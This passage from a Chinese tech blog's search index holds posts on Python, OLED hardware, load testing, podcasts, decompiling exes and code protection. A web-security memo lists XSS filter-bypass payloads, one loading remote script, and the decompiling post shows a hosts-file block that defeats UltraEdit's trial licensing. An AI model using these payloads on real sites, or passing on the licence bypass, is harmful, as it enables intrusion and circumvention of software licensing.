c.isalpha(), c.isdecimal(), c.isdigit(), or c.isnumeric(). 如果都是字母和数字时候，return True, else return False. str.isalpha() Return true if all characters in the string are alphabetic and there is at least one character, false otherwise.Alphabetic characters are those characters defined in the Unicode character database as “Letter”,ie.e., those with general category property being one of “Lm”,”Lt”, “Lu”,”Ll” or “Lo” .Note that this is different from the “Alphabetic” propertty defined in the Unicode Standard. 判断str是否都是数字 str.isdecimal() Return true if all characters in the string are decimal characters and there is at least one character,false otherwise.Decimal characters are those from general catefory “Nd”. This category includes digit characters,and all characters that that can be used to form decimal-radix numbers,e.g. U+0660,ARABIC-INDIC DIGIT ZERO. 判断str是否是十进制数。 str.lstrip([chars]) Return a copy of the string with leading characters removed. The chars argument is a string specifying the set of characters to be removed. If omitted orNone, the chars argument defaults to removing whitespace. The chars argument is not a prefix; rather, all combinations of its values are stripped: ' changxufeng'.lstrip()\\当argu为空是，返回结果为去掉str前面的空格。不影响原来str的值，只是一份copy 'changxufeng'.lstrip(chang)\\return ‘xufeng’ 如果去掉首位的空格可以使用str.strip() 'changxufeng'.rstrip('xufeng')\\return ‘cha’ str.title() Return a titlecased version of the string where words start with an uppercase character and the remaining characters are lowercase. The algorithm uses a simple language-independent definition of a word as groups of consecutive letters. The definition works in many contexts but it means that apostrophes in contractions and possessives form word boundaries, which may not be the desired result: string中首字母大写。","link":"/2018/03/01/old-string-formatting/"},{"title":"0.96 OLED Display","text":"之前买过一个0.96英寸的OLED屏幕，一直没有用，最近想着做个小的玩具，比如放在桌面上的小摆件可以提醒生词，提醒todo-list等，或者结合esp8266做成一个情侣见互相留言的小玩具。 ##关于OLED OLED，即有机发光二极管( OrganicLightEmittingDiode)。 OLED 由于同时具备自发光，不需背 光源、对比度高、厚度薄、视角广、反应速度快、可用于挠曲性面板、使用温度范围广、构造及 制程较简单等优异之特性，被认为是下一代的平面显示器新兴应用技术。LCD 都需要背光，而 OLED 不需要，因为它是自发光的。这样同样的显示 OLED 效果要来得好一些。 说说踩过的坑1.因为使用Micropython，可以参考的资料非常少。 2.这个OLED本身不带字库，除了英文和标准绘图（点、线、形状）之外都需要使用其他方式实现。 3.依赖SSD1306驱动，不能像Arduino的u8g2库一样强大，许多功能需要自己实现。 ##中文文字转字模型所有显示的中文都需要转换成字模，其实在购买屏幕的时候随机送了一个中文取字模的软件。PCtoLCD2002，但是我用的是Mac，总不能为了这个字模装个虚拟机吧，虽然我将另外一台win10开启了远程桌面，但是也不便于形成Demo后别人使用，在有网环境下可以用我写的一个小脚本fontool.可以方便的将想要显示的中文转换为字模。 ##图片显示关于图片的显示，网上有两种方案（基于Arduino）一种是将图片转换为二进制bin文件，另一种和中文差不多，将图片的像素转换为01二进制，0为不现实1为亮。没有现成的库。 ###实现图片的显示以我的头像这个dogydog为例。这里需要用的的python库 PIL （Pillow） 1.首先将图片处理为灰度模式，然后改变图像的大小，这里有个坑，其实你直接使用PIL的resize就好但是网上的多处例子谈到img = img.resize((w,h),Image.ANTIALIAS) 这个地方的Image.ANTIALIAS其实是用来处理大型图片缩放时候用到的一个滤镜，对比PS的文件处理速度会快一些而且质量会好一些，在应用与低质量的显示比如这块128 * 64的屏幕上完全用不到精细化处理，而且会适得其反，因为8266的内存有限，使用滤镜生成的bin文件会很大，而且在128*64这样的屏幕上会有毛刺。 对比效果 2.然后逐行的读取每个像素点的数值，生成10矩阵。代码在这里 显示效果","link":"/2019/02/26/oled-display/"},{"title":"Markdown Awesome","text":"` ` 在markdown文章张使用图标装饰在之前的工作中制作原型，包括上一篇文章中用到的iconfont的图标，每次都要处理多次。看到bootstrap的教程中使用@face-font 可以使用图标，突然想到markdown能否直接调用iconfont、fontawesome的图标？网上一搜果然是有的，像我一样的懒人在我之前就存在。 准备工作Font Awesome是一个字体和图标工具包，包含人物、动物、建筑、商业、品牌、娱乐、动作等等各种主题丰富的图标符号，iconfont也类似起步晚一点是ali旗下的一个开源工具包。 要在markdown文档中输入Font Awesome，需要在文档任意位置输入一下代码调用JavaScript。 12345&lt;head&gt; &lt;script defer src=\"https://use.fontawesome.com/releases/v5.0.13/js/all.js\"&gt;&lt;/script&gt; &lt;script defer src=\"https://use.fontawesome.com/releases/v5.0.13/js/v4-shims.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;link rel=\"stylesheet\" href=\"https://use.fontawesome.com/releases/v5.2.0/css/all.css\" integrity=\"sha384-hWVjflwFxL6sNzntih27bfxkr27PmbbK/iSvJ+a4+0owXq79v+lsFkW54bOGbiDQ\" crossorigin=\"anonymous\"&gt; iconFont的使用方法类似，但是区别是，需要将使用的图标先用自己的账号登陆后，收藏然后下载生成的css文件。需要引用本地的css文件。当然灵活性要差一点，必须之前没有收藏某个图标，这下抓瞎了吧。😭生成的css文件格式格式类似如下： //at.alicdn.com/t/font_8d5l8fzk5b87iudi.css 使用方法现在就可以直接插入Font Awesome和iconfont的符号了。 1&lt;i class=\"fa fa-weixin\"&gt;&lt;i&gt; iconfont使用方法类似 1&lt;i class=\"iconfont icon-xxx\"&gt;&lt;/i&gt; 这是表示插入了一个微信图标的符号。 获取符号名称fa-weixin 是微信的\b名称，如何\b调用其他的\b图标呢？在\bawesome 获取后可以保存到LaunchBar中一遍以后方便使用。iconfont 只需要点击收藏就好，在生成的css中可以查询。 调节尺寸1&lt;i class=\"fa fa-weixin\"&gt;&lt;i&gt; 扩展改写为： 1&lt;i class=\"fa fa-weixin fa-2x\"&gt;&lt;i&gt; 可用参数列表：123456fa-xsfa-smfa-lgfa-2x至fa-10x\b### 动画效果\b在class中加入 “fa-spin” 使符号变成连贯转动，加入“fa-pulse”变成8步\b旋转效果。 符号的特殊用法####符号下沉 1234&lt;i class=\"fas fa-quote-left fa-3x fa-pull-left\"&gt;&lt;/i&gt;fa-quote-left 是符号名称fa-3x 表示大小fa-pull-left 符号下沉 上篇文章中所应用到的图标 应该如下正确使用: 小火箭 以上是\bicon的应用，接下来制定自己的学习计划，开始学习Vue.js。","link":"/2018/08/17/markdown-awesome/"},{"title":"性能压力测试的学习","text":"一个新的技术引入之前，需要做好评估，压测只是其中一个阶段。 某些中间件的版本升级，都需要进行简单的压测，这样可以排除外部依赖的性能瓶颈。 参数的调整很可能带来一些意想不到的问题，比如 JVM 调整了垃圾回收策略、TCP 改为了 UDP 等等，都需要进行回归压测。通常，不会有问题；意外，总发生在不经意间。 压力测试指标💯RQS 每秒查询率，QPS 是对一个特定的查询服务器在规定时间内所处理流量多少的衡量标准。 单位是request/s。 一般压测工具都会有这个指标，简单明了，每秒处理的请求数量。 1236796 requests in 10.05s, 783.13KB readRequests/sec: 676.21Transfer/sec: 77.92KB 当前每秒请求数 676.21 RT 响应时间，这个指标比较多，比如，最小响应时间、平均响应时间、最大响应时间等等，详细指标还有P50、P95、P99 等等 12345Latency Distribution 50% 23.03ms 75% 24.01ms 90% 25.38ms 99% 32.33ms 比如，50%的请求在23.03ms内返回响应。 VU 虚拟用户，系统模拟并发的用户。主要目的是最大程度的模拟用户操作，从而得到较为准确的压测数据，这个参数一般由压测人员制定，梯度递增。 12345阶段1: 50虚拟用户，压测1小时；阶段2: 100虚拟用户，压测1小时；阶段3: 150虚拟用户，压测1小时；阶段4: 200虚拟用户，压测1小时；阶段5: 250虚拟用户，压测1小时； 一般在为达到最佳负载的情况下，QPS 会随着VU的数量等比递增。 比如，50VU下的QPS是1000，那么100VU下的QPS会接近2000 。 操作系统负载，外部系统等压测期间，还需要关注下服务器的负载、网络 IO 情况，如果是 Java 工程，观察 JVM 也是很有必要的。如果涉及到外围系统，比如 Mysql、Redis 等，那么也要纳入观察范围。 指标的观察运行良好的特征 测试期间响应时间呈平稳趋势；请求速率遵循与虚拟用户相同的斜坡（如果 VU 增加，则请求速率也会增加）； 达到最大吞吐量的特征 随着虚拟用户数量的增加，活动的正在进行中的请求数量继续增加，而 QPS（完成的请求）却趋于平稳（甚至下降）。此时，系统过载，从而导致更长的响应时间。HTTP 失败率增加 性能问题/瓶颈的特征 测试期间响应时间显著增加；响应时间显著增加，然后迅速触底并保持平稳（HTTP 被降级了）；QPS 不会随着 VU 的增加而增加，并且响应时间开始增加，疑似达到最大吞吐量； 发生故障的特征 高 HTTP 错误率低 QPS 下的系统高负载 图例 可视化的图表可以更加直观的分析 请求速率遵循与虚拟用户相同的斜坡通过这个图，可以看出，在负压不大的情况下，这两个图表是有相同的斜坡的。 而QPS在 12:18时突降，观察 JVM 可以知道，是出现了FGC。 测试期间响应时间呈平稳趋势 因为是外网压测，我们允许一定区间的网络波动，如上图的作图，观察P90、P95两条曲线，大致在我们预测的范围之内。右图的网格也显示出，大部分请求耗时集中在256ms到521ms之间，整体上散射保持一致。 压测工具不同的压测工具的优缺点是不同的，设置压测出来的指标也会有较大差异。我们在执行压测时，更应该发现压测中出现的各种各样的问题。比如，我用jmeter压测 30s 的QPS是 5000，而用wrk的QPS可能只有 1000，这种情况都是有具体原因的。jmeter在连接数还没有达到最大值的时候，就已经开始计算 QPS 了，导致短时间压测的 QPS 偏大，随着压测时间增长，QPS会降低。","link":"/2020/04/22/performance-pressure-test/"},{"title":"web安全备忘录","text":"目录 基本网络思维模型 TCP&amp;UDP 笔记 XSS 备忘录 SSRF 备忘录 逻辑漏洞备忘录 上传漏洞备忘录 PHP 远程代码执行备忘录 引用XXE 外部实体注入 RCE_bypass 笔记 0x1 基本网络思维模型1.1 技术架构CS(Client/Server)Client 指的是客户端，我们每个人的电脑都可以当做一个客户端，日常的一些上网，使用谷歌浏览器搜索东西，打开视频软件浏览视频，打开音乐播放器下载歌曲…这些操作都是要与远方的另一台电脑进行通信的，远方的那台计算机称为服务器（Server）。1.2 技术架构BS(Browser/Server)通过浏览器访问服务器端的都可以称为BS架构。 Tips：通常的话 BS 架构也是在 CS 架构里面的，但是因为互联网发展迅速，更新换代太快，所以单独将 BS 架构这块分了出来。 1.3 HTTP请求头 协议头 说明 X-Forwarded-For 用来表示 HTTP 请求端真实 IP Accept 可接受的响应内容类型（Content-Types） Accept-Charset 可接受的字符集 Accept-Encoding 可接受的响应内容的编码方式 Accept-Language 可接受的响应内容语言列表 Accept-Datetime 可接受的按照时间来表示的响应内容版本 Cookie 由之前服务器通过Set-Cookie（见下文）设置的一个HTTP协议Cookie Content-Length 以8进制表示的请求体的长度 Content-MD5 请求体的内容的二进制 MD5 散列值（数字签名），以 Base64 编码的结果 Content-Type 请求体的MIME类型 （用于POST和PUT请求中） Date 发送该消息的日期和时间 Expect 表示客户端要求服务器做出特定的行为 From 发起此请求的用户的邮件地址 Host 表示服务器的域名以及服务器所监听的端口号。 Origin 发起一个针对跨域资源共享的请求（该请求要求服务器在响应中加入一个Access-Control-Allow-Origin的消息头，表示访问控制所允许的来源）。 Range 表示请求某个实体的一部分，字节偏移以0开始。 Referer 表示浏览器所访问的前一个页面，可以认为是之前访问页面的链接将浏览器带到了当前页面。 User-Agent 浏览器的身份标识字符串 1.4 HTTP响应头| 响应头 | 说明 || ————————— | ———————————————————— | —-| Access-Control-Allow-Origin | 指定哪些网站可以跨域源资源共享| Accept-Patch | 指定服务器所支持的文档补丁格式| Accept-Ranges | 服务器所支持的内容范围| Age | 响应对象在代理缓存中存在的时间，以秒为单位| Allow | 对于特定资源的有效动作;| Cache-Control | 通知从服务器到客户端内的所有缓存机制，表示它们是否可以缓存这个对象及缓存有效时间。其单位为秒 || Connection | 针对该连接所预期的选项| Content-Disposition | 对已知MIME类型资源的描述，浏览器可以根据这个响应头决定是对返回资源的动作，如：将其下载或是打开。| Content-Encoding | 响应资源所使用的编码类型。| Content-Language | 响应内容所使用的语言| Content-Length | 响应消息体的长度，用8进制字节表示| Content-Location | 所返回的数据的一个候选位置| Content-Type | 当前内容的MIME类型| Date | 此条消息被发送时的日期和时间| Location | 用于在进行重定向，或在创建了某个新资源时使用。| Proxy-Authenticate | 要求在访问代理时提供身份认证信息。| Refresh | 用于重定向，或者当一个新的资源被创建时。默认会在5秒后刷新重定向。| Server | 服务器的名称| Set-Cookie | 设置HTTP cookie| Status | 通用网关接口的响应头字段，用来说明当前HTTP连接的响应状态。| Trailer | Trailer用户说明传输中分块编码的编码信息| Transfer-Encoding | 用表示实体传输给用户的编码形式。包括：chunked、compress、 deflate、gzip、identity。 1.5 HTTP请求方式GET\\POST\\PUT\\COPY\\DELETE\\OPTIONS\\PATCH 1.6 HTTP常见状态码200、301、302、500、404、403、502 1.7 GET和POST的区别浏览器限制GET接收的的长度，但是不限制POST提交的长度，POST提交的长度取决于服务器。 数据接收方式 GET请求接收的方式是通过浏览器的地址栏来接收的，而POST是通过表单隐藏式的提交数据。 1.8 局域网的简单通信（数据链路层） 一般局域网都是通过交换机/路由器进行通信。 很早之前的网络大部分是通过HUB（集线器）进行通信。 缺点就是主机发送的数据包都会被其他的主机接收到，这个过程称为泛洪。 交换机在此基础上进行了改进，使其变得更安全，同样也保留了HUB的一些功能。 局域网通过MAC地址表来进行数据通信。 1.9 交换机主机通信过程 交换机 ARP 广播 PC计算机接收响应 发送数据 —&gt; 交换机转发并记录MAC地址 如果交换机的MAC表被填满，将会泛洪（ARP毒化） ARP欺骗 —&gt; 伪造MAC地址来进行欺骗的效果 Tips：有些交换机重启的时候会清空MAC地址表。 0x2 TCP&amp;UDP1. 知名端口系统程序所使用的端口号 12345678telnet 23 ftp 21 http 80 https 443 smtp 25 dns 53 DHCP 67 tftp 69 2. 动态端口动态端口的范围时 1024-65535,当服务或者程序关闭时也就释放了所占用的端口 1234567891011121314151433 MSSQL 1521 Oracle 3306 MySQL 5432 PostgreSQL 6379 redis 27017 Mongodb 5000 DB2 4848 glassfish7001 WebLogic 2601 zebra路由，默认密码zebra 3389 远程桌面 (shift 后门) 8080 apache tomcat 5900 vnc 虚拟网络控制台 11211 memcache未授权访问 2181 Zookeeper未授权访问 3.查看端口12345netstat -an | grep “:8080” # 显示打开的端口所在协议。lsof -i :8080 # 显示对应端口的服务名称（所用程序）。netstat -anp | grep “:8080” # 查看上面两条命令的综合信息 Tips：如果该服务不属于当前的用户，需要sudo权限（root） 4.UDP协议UDP发送数据之前不需要建立连接 特点： 无连接 资源开销小 传输速度快 udp每个数据包最大64k 优点： 传输速度快 不需要连接，资源开销小 缺点传输数据不可靠，容易丢数据包，没有流量控制，当对方没有及时接受数据，发送方一直发送数据包会导致缓冲区数据溢出，电脑出现卡死情况，所有接受方需及时接受数据。 UDP 使用场景当对网络通讯质量要求不高的时候，要求网络通讯速度尽量的快。 例如 ： 音视频传输 共享屏幕软件 发送广播消息 特点： 无连接 资源开销小 传输速度快 udp每个数据包最大64k Python socket1234import socketsocket.socket(AddressFamily,Type)AddressFamily：IP地址类型；AF_INET代表ipv4类型、AF_INET6表示ipv6类型；Type：套接字类型，可以是SOCK_STREAM (流式套接字，主要用于TCP协议) 或者 SOCK_DGRAM（数据报套接字，UDP协议） 5.TCP协议面向连接通信双方必须先建立连接才进行数据的传输，双方都必须为该连接分配必要的系统内核资源，以管理连接的状态和连接上的传输,双方间的数据传输都可以用过这一个连接进行,完成数据交换后，双方必须断开此连接，以释放系统资源,这种连接是一对一的，因此TCP不适合于广播的应用程序，基于广播的程序请使用UDP协议。 可靠传输 tcp 采用发送应答机制 tcp发送的每一条报文段必须得到接收方的应答才认为这个tcp报文段传输成功 超时重传 发送端发出一个报文之后启动定时器，如果在定时时间内没有收到应答就重新发送这个报文段 错误效验 检测数据到发送端到接收端之间是否有改动，直接丢弃这个数据包 流量控制和阻塞管理 流量控制用来避免主机发送得过快而使接收方来不及完全收下。 TCP 使用场景当对网络通讯质量有要求的时候，比如 HTTP，HTTPS，FTP等网络传输协议，POP，STMTP等邮件传输协议。 0x3 XSSXSS 又叫CSS (Cross Site Script) , 跨站脚本攻击。以下为学习《心伤的瘦子XSS系列》的个人笔记，和其他总结的内容。 1. 一个普通反射型的XSS 1http://localhost/xxxxxxxssssssssssss/xss.php?name=&lt;script&gt;alert(1)&lt;/script&gt; 2. HTML编码 123http:// &amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47; &amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f; Tips: 这三个是标签是相等的,都为 http:// ，其中 Hex 是十六进制编码,Dec 是十进制编码。 这种编码在 html 执行的前提是,必须在值里例如： 12&lt;a href=”xxx”&gt;&lt;img src=”xxx”&gt; 3. Unicode编码 Js中是允许使用 unicode编码的。 1234&lt; == “\\x3c” == “\\u003c”&gt; == “\\x3e” == “\\u003e”空格 == “\\x20” == ” \\u0020”..... 4. CSS编码 使用 Unicode 写中文字体名称，浏览器是可以正确的解析的。例如：font-family: “5FAE8F6F96C59ED1”，表示设置字体为“微软雅黑”。CSS 中 expression 用来把CSS属性和Javascript表达式关联起来。 1&lt;img src=\"URL\" style='Xss:expression(alert(/xss/));'&gt; Tips: 但是这种的只能在IE6 , IE7 中才会触发。 5. 宽字节 Gbxxx系列编码。 12%aa将%27吞并组成一个gbxxx字符 ==&gt; 猏’%aa%27 | alert(1)// 6. eval(string) 函数 eval 函数可计算某个字符串，并执行其中的的 JavaScript 代码。 1eval('alert(1)') 7. fromcharcode() 函数 可接受指定的unicode编码的值，返回字符串，可以配合eval函数使用。 12345alert(1) ==&gt; String.fromCharCode(97,108,101,114,116,40,49,41)// 结合 eval() 函数eval(String.fromCharCode(97,108,101,114,116,40,49,41)) 8. 伪协议 1234Javascript:alert(document.domain) data:text/html,&lt;script&gt;alert(1)&lt;/script&gt; data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== vbscript: xxxx // IE中运行 9. URL编码 1234567891011121314%0a // URL换行符 %20 // 空格! %21 &quot; %22 # %23 $ %24 % %25 &amp; %26 ' %27 ( %28 ) %29 * %2A + %2B ...... 10. JS 多行字符串 12345Var a='\\Test\\En\\//coding\\Aaa' 11. JS特性 12&amp; 比 = 优先级高== 比 &amp; 优先级高 Javascript 是从上到下按顺序执行的。 12345678910test()function test(){//code... 这种形式定义的函数会被优先解析} # 实际解析顺序function test(){//code... 这种形式定义的函数会被优先解析} test() 12. 注释符 123// // js注释&lt;!-- --&gt; // HTML注释/**/ // js注释 13. HTML属性 当元素失去焦点时发生的事件，按下tab键触发js。 1&lt;aaaa tabindex=1 onblur=\"alert(1)\"&gt;&lt;/aaaa&gt; 当元素获得焦点时发生的事件，按下tab键触发js。 1&lt;aaaa tabindex=1 onfocus=\"alert(1)\"&gt;&lt;/aaaa&gt; 14. JS 黑魔法 1.jjencode –将JS代码转换成只有符号的字符串。 1网址：http://utf-8.jp/public/jjencode.html 2.aaencode –将JS代码转换成常用的网络表情。 1网址：http://utf-8.jp/public/aaencode.html 3.Jsfuck –使用六个不同的字符来编写和执行代码。 1网址：http://utf-8.jp/public/aaencode.html 15. 常用绕过 Payload 1234567891011121314151617181920212223&lt;svg/onload=prompt(1);&gt; // 短的xss_payload&lt;q/oncut=open()&gt; // 短的xss_payload&lt;q/oncut=alert(1)&gt; // 短的xss_payload&lt;scrip&lt;script&gt;t&gt;alealertr(1)&lt;/scrip&lt;script&gt;t&gt; // 过滤不严&lt;ScriPt&gt;alErT(1)&lt;/sCripT&gt; // 大小写绕过&lt;script&gt;prompt(1);&lt;/script&gt; // 过滤alert 情况下&lt;script src=\"http://www.secbook.info/demo.js\"&gt;&lt;/script&gt;&lt;div onclick=\"alert('xss')\"&gt; // 点击它后会触发&lt;div onmouseenter=\"alert('xss')\"&gt; // 用户鼠标移动到 div 上时会触发&lt;iframesrc=\"javascript:alert(2)\"&gt;&lt;iframe/src=\"data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\"&gt;&lt;%0ascript&gt;alert(1);&lt;/script&gt; // 语法 BUG","link":"/2020/06/18/network-security-basic/"},{"title":"播客Feed订阅","text":"🎧 使用 iPhone Safari / Android 系统浏览器，打开本网页，点击下方播客名字，即可添加订阅到播客应用添加到： RSS、 iTunes、 苹果播客、 Overcast、 Castro、 Pocket Casts 看理想《一千零一夜》 看理想《圆桌派》 原来是这样？！ 日谈公园 黑水公园 黑水公园：微信精选推送(微信) 黑水怪谈(微信) 金花漫话(微信) 黑水记(微信) 反派影评 反派影评：耳边风(微信) 反派影评：马后炮(微信) 野史下酒：微信推送 鬼影人间 观复嘟嘟 冬吴同学会 吴晓波频道 诗展侃历史 有话说历史 历史趣谈 大力史 朴素心理学 这事儿我跟你讲 北京话事人 发发大王 齐齐酷咖 糖蒜广播 漫藏道 丁丁说车 王东电台 糗事播报 讨厌在城市读书 游戏时光-VGtime VG聊天室 虎嗅·商业有味道 晓评 读书有疑 静说日本 三联•听周刊 晓说2018 可以谈 婊酱FM 迷失音乐 1UP 播客 友的聊播客 美术史 局座召忠：局座时评(微信) 科学声音龙门阵 36氪·硅谷早知道 第二季 看理想《局部 第一季》 看理想《听说 第一季》","link":"/2018/08/03/podcast/"},{"title":"python-map-reduce","text":"在Python里内建了Map和Reduce 函数，一开始怎么也看不明白，看图识也不明白。 直到看了”MapReduce:Simplified Data Processing on Large Clusters” link（面向大型集群的简化数据处理）这个论文来自GOOGLE.Map(映射)Reduce(化简)MapRedce 既是一种编程模型，也是一种与之关联的、用于处理和产生大数据集的实现。用户要特化一个map程序去处理key/value对，并产生中间key/value对的集合，以及一个Reduce程序去合并有着相同key的所有中间key/value对。 用这种函数风格写出的程序自动就拥有了在一个大的PC机集群上并执行的能力。运行时系统会负责细节：切分输入数据，在一组机器上调度执行程序，处理机器错误，以及管理所需的机器间通信。这允许不具备任何并行和分布式系统经验的程序员也能轻松地利用一个大型分布式系统的资源。我们的MapReduce实现运行在一个大型PC机集群上，且具有很好的扩展性：一个典型的MapReduce作业运行在Google的集群上。编程模型计算过程就是输入一组key/value对，再生成一组key/value对。MapReduce库的使用者用两个函数来表示这个过程：map和reduce。 map由使用者编写,使用一个输入key/value对，生成一组中间key/value对。MapReduce库将有着相同中间Key I中间的value都组合在一起，再传给reduce函数。reduce也由使用者编写，它接受一个中间Key I 和一组与I对应的value.他将这些value合并为一个可能更小的value集合。通常每个reduce调用只产生0或1输出value.中间value是通过一个迭代器提供给reduce函数的。这允许我们操作那些因为大到找不到连续存放的内存而使用链表的value集合。 Example: 123456789101112key,String value): //key:文档名 //value：文档内容 for each word w in value: EmitIntermediate(w,\"1\");reduce(Stringkey,Iterator values): //key:一个单词 //value:计数值列表 int result = 0; for each v in values: result += ParseInt(v); Emit(AsString(result)); map函数将每个单词与出现次数一同输出（↑例子中鸡蛋的那输出“1”）reduce函数将针对某个特定词输出的次数都合并相加。 另外，使用者要写代码填充一个符合MapReduce规格的对象，内容包括输入和输出文件的名字，以及可选的调节参数。之后使用者调用MapReduce函数，将指定到对象传进去。用户代码会与MapReduce库链接到一起。 实现许多不同的MapReduce的实现都是可行的。选择哪一个要取决于环境。例如，一种实现可能适合于小型的共享内存机器，一种实现可能适合于大型的NUMA多处理器机器，而另一种则适合于更大型的联网机器集。 本部分描述的实现主要面向Google内部广泛使用的计算环境：大型的商用PC机集群，互相之间用交换式以太网连接。我们的环境是： 主要使用的机器为双核X86处理器，运行Linux系统，每台机器的内存从2GB到4GB不等。 使用的都是商用网络硬件设备——在机器层面上通常从100Mbps到1Gbps不等，但平均起来要比总带宽的一半少很多。 集群中拥有数百或数千台机器，因此机器错误经常出现。 每台机器都使用廉价的IDE硬盘来提供存储功能。我们使用一种内部开发的分布式文件系统来管理这些磁盘上的数据。这个文件系统通过复制的方法在不可靠的硬件之上提供了实用性与可靠性。 用户向一个调度系统提交作业。每个作业包括了一个任务集，会由调度器调度到集群内可用的一组机器上。","link":"/2016/09/26/python-map-reduce/"},{"title":"python-analytics","text":"最近小红说要买个二手房，让我帮忙看一下二手房的信息，嗯毕竟买房是个麻烦事，而近一个月济南房价真是涨疯了。 刚好现在学python，正好可以拿来作为练手，想要实现二手房的价格数据分析。 首先想了一下基本的逻辑，先从58同城爬取一下以区域划分的房源信息。 1.首先使用Chrome调试工具分析出页面中的信息所在tag的位置，通过BeautifulSoup或正则re或lxml这三个Modules分析出信息。 由于三个Modules掌握都不熟练所以这混合了这三种模块。 通过输入可以选择不同的行政区进行数据的选择。 只有数据还不够直观，通过地理位置的抓取和高德地图的逆解析得到房源信息的坐标，然后展示到地图上。嗯 就这么干… 在匹配数据的过程中，发现会被高德(阿里)的服务器拒绝，所以加了延时500ms。 爬取得到的房源数据 你解析得到的坐标数据 放到页面上，alpha_version 可解析出房源所在位置附近的商圈。 觉得有点丑，然后又有了第二个版本2nd 在此版本中发现，如果坐标一样或者坐标太近等原因导致大量的数据没有被展现出来。然后又有了第三个版本。热点Heatmap 好吧，轮子造到这里。鉴于近期济南房价的疯狂涨势,留着数据，一个月后再爬取一下，再做个涨幅数据的分析。","link":"/2016/09/08/python-analytics/"},{"title":"反编译pyinstaller生成的exe程序","text":"帮别人做了一个项目，需要exe执行，使用pyinstaller进行了打包操作，发给用户后，然后源文件没有放网盘，客户还需要修改一个东西。现在手头只有一个exe，总不能把时间浪费在路上毕竟这不是人干的事。 1. 将exe反编译为pyc使用pyinstxtractor 将exe进行反编译，提取由pyinstaller 生成的可执行文件内容。 pyinstaller Extractor项目地址extractor Useage: python pyinstxtractor.py Main.exe 运行后可以得到一个提取的文件夹 )) 使用Uncompyle6反编译 *.pyc 文件使用了在线版本pyc转py，尝试了几个网站都不能正常的反编译。看到uncompyle2的后续版本uncompyle6 项目地址：uncompyle6 如果直接使用uncompyle6 进行反编译可能会遇到以下两种报错情况，别问我怎么知道的。 1.ImportError: Unknown magic number 227 in bit.pyc 2.bad marshal data (unknown type code) 在使用uncompyle6之前我们需要二进制编辑软件，我用的是Ultraedit UltraEdit 27.0.0.94 官方简体中文版安装包 [2020/07/31]x86 https://downloads.ultraedit.com/main/ue/win/ue_chinese.exex64 https://downloads.ultraedit.com/main/ue/win/ue_chinese_64.exe 解决ultraedit 试用期的问题，只需要在hosts文件中添加以下两行： 12127.0.0.1 licensing.ultraedit.com127.0.0.1 swupdate.ultraedit.com 使用UltraEdit打开提取目录中的struct.pyc文件，复制0-F 二进制数据粘贴到源码pyc中。 接下来使用： uncompyle6 bit.pyc &gt; bit.py 即可得到我们反编译后的源码文件了。","link":"/2020/08/31/pyexe2py/"},{"title":"关于保护python代码的思考","text":"由于Python的动态特性和开源特点，导致Python代码很难做到很好的加密。社区中的一些声音认为这样的限制是事实，应该通过法律手段而不是加密源码达到商业保护的目的；而还有一些声音则是不论如何都希望能有一种手段来加密。于是乎，人们想出了各种加密或混淆的方案，来达到保护源码的目的。 常见的源码保护手段有如下几种： 发行pyc文件 代码混肴 使用py2exe 使用Cython 发行pyc文件思路Python解释器在执行的过程中会首先生成pyc文件，然后解释执行pyc文件中的内容。当然python解释器也能够直接执行pyc文件。而pyc文件时二进制文件，无法直接看出源码内容。如果发行代码到客户端环境时都是pyc文件而非py文件，那岂不是达到保护源码的目的。 方法python标准库中提供了一个名为compileall的库，可以轻松编译。 python -m compileall 目录名 然后删除执行目录下的所有py文件 优点 简单方便，提高了一点源码破解的门槛 平台兼容性好 不足 解释器兼容性差，pyc只能在特定版本的解释器上运行 有现成的反编译工具，破解成本低 python-uncompyle6就是这样一款反编译工具，效果出众。 uncompyle6 *compiled-python-file-pyc-or-pyo* 代码混淆思路通过一系列的转换，让代码不容易阅读，移除注释和文档，改变缩进，在空白行插入无效代码。 方法1: 使用oxyry进行混肴http://pyob.oxyry.com 是一个在线混淆Python代码的网站，使用它可以方便的进行混淆。 方法2：使用pyobfuscate库进行混淆pyobfuscate算是一个颇具有年头的Python代码混淆库了，但是却“老当益壮” 对比oxyry的混淆方式，增加了无效的代码行。 优点 简单方便，提高了一点源码破解的门槛 兼容性好 不足 只能对单个文件混淆，无法做到多个呼啸有联系的源码文件的联动混淆 代码结构未发生变化，也能获取字节码，破解难度不大 使用py2exe，pyinstaller使用Cpython思路Cpython将py和pyx编译为c文件，再将c文件编译为so或pyd，除了能够带来性能的提升，另一个好处时难以破解。 方法： 编写hello.pyx或hello.py： 12def hello(): print('hello') 编写setup.py 1234from distutils.core import setupfrom Cython.Build import cythonizesetup(name='Hello World app', ext_modules=cythonize('hello.py')) 编译为c，再进一步编译为so或pyd python setup.py build_ext --inplace 执行python -c &quot;from hello import hello;hello()&quot;即可直接引用生成的二进制文件中的hello()函数。 优点 生成的二进制so或pyd文件难以破解 同时带来了性能提升 不足 兼容性稍差，对于不同版本的操作系统，可能需要重新编译 虽然支持大多数的python代码，但如果一旦发现部分代码不支持，完善成本较高","link":"/2020/10/28/protect-python-sourcecode/"},{"title":"Raspberry Os","text":"常用树莓派系统","link":"/2018/11/22/raspberry-os/"},{"title":"Python 推送信息到wechat","text":"前言最近看到网上有定时推送文章到微信的文章，其实这个小功能我一直在做，包括定时爬取内容用邮件发送等等。不过网上都是python2.7的版本。对于使用python3的小白可能用起来比较困惑，手动改了一个python3的版本。 #实现环境 python3.6(conda) 数据源：爱词霸 调用地址：http://open.iciba.com/dsapi/ 请求方式：GET 请求参数： 参数 必选 类型 说明 \bdate 否 string 格式为：2018-08-01；默认取当天 type 否 string 可选值为last和next；以date日期为准的last返回前一天，next返回后一天。 代码示例 123456789#coding=utf-8import jsonimport requestsdef get_iciba(): url = 'http://open.iciba.com/dsapi/' request = requests.get(url) data = json.loads(request) #将json转换为dict return dataprint(get_iciba()) 返回类型：JSON (JSON字段解释：) 属性名 属性值类型 说明 sid string 每日一句id tts string 音频地址 content string 英文\b内容 note string 中文内容 love string 每日一句喜欢个数 translation string 词霸小编 picture string 图片地址 picture2 string 大图片地址 caption string 标题 dateline string 时间 s_pv string 浏览数 sp_pv string 语音评测浏览数 tags string 相关标签 fenxiang_img string 